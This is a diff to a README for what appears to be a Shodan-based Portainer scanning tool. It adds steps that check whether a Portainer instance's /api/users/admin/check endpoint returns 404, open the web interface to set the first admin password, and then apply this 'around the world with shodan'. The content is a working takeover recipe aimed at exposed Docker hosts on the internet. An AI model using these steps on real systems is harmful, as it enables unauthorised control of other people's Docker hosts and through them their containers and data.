@@ -18,6 +18,12 @@ Portainer provides an API endpoint (/api/users/admin/check) to verify that the a
 
 Manual steps to reproduce the vulnerability:
 
+1. docker run --rm -it -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer
+2. curl -X GET -s -o /dev/null -w "%{http_code}" http://127.0.0.1:9000/api/users/admin/check
+3. If curl return 404, open web-browser and create a admin password. xdg-open http://127.0.0.1:9000
+
+Applying this around the world with shodan:
+
 ```bash
 git clone git@github.com:lichti/shodan-portainer.git
 virtualenv --python python3 .venv
